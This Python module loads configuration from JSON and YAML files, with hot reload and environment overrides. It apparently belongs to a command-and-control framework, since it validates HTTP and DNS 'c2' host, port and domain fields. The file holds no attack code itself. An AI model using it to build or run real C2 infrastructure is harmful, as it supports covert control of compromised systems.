# File: modules/config.py

"""
Enhanced configuration loader:
• Supports JSON (config.json) + optional config.yaml for overrides.
• Hot reloads when either file changes.
• Validates required fields at load time.
• Environment variables override both.
"""

import os
import time
import json
import yaml
import threading
import logging
from pathlib import Path
from cryptography.fernet import Fernet

logger = logging.getLogger("config")

CFG_FILE_JSON = Path(__file__).parent.parent / "config.json"
CFG_FILE_YAML = Path(__file__).parent.parent / "config.yaml"
LAST_MOD = {"json": 0, "yaml": 0}
_config = {}
_lock = threading.Lock()

def _env_override(d, prefix="BISMILLAH"):
    for k, v in d.items():
        env_key = f"{prefix}_{k.upper()}"
        if env_key in os.environ:
            # Attempt to cast to same type
            orig = v
            nv = os.environ[env_key]
            if isinstance(orig, bool):
                d[k] = nv.lower() in ("1", "true", "yes")
            elif isinstance(orig, int):
                d[k] = int(nv)
            else:
                d[k] = nv
        elif isinstance(v, dict):
            _env_override(v, prefix + "_" + k.upper())

def _validate(cfg: dict):
    """
    Ensure required fields exist: c2.http.host, c2.http.port, c2.dns.domain, etc.
    """
    try:
        http = cfg["c2"]["http"]
        assert "host" in http and "port" in http
        dns = cfg["c2"]["dns"]
        assert "domain" in dns and "port" in dns
        return True
    except Exception as e:
        logger.error(f"[CONFIG] Validation failed: {e}")
        return False

def _load():
    global _config, LAST_MOD
    changed = False
    # Check JSON
    if CFG_FILE_JSON.exists():
        m = CFG_FILE_JSON.stat().st_mtime
        if m > LAST_MOD["json"]:
            _config = json.load(open(CFG_FILE_JSON))
            LAST_MOD["json"] = m
            changed = True
    # Check YAML overrides
    if CFG_FILE_YAML.exists():
        m = CFG_FILE_YAML.stat().st_mtime
        if m > LAST_MOD["yaml"]:
            ycfg = yaml.safe_load(open(CFG_FILE_YAML))
            _config.update(ycfg)
            LAST_MOD["yaml"] = m
            changed = True
    if changed:
        _env_override(_config)
        if not _validate(_config):
            raise ValueError("Invalid configuration")
    return _config

def load_config():
    with _lock:
        return _load()

# Optionally, spawn a thread to reload every minute
def start_config_watcher():
    while True:
        time.sleep(60)
        try:
            _load()
        except Exception as e:
            logger.error(f"[CONFIG] Hot‑reload failed: {e}")
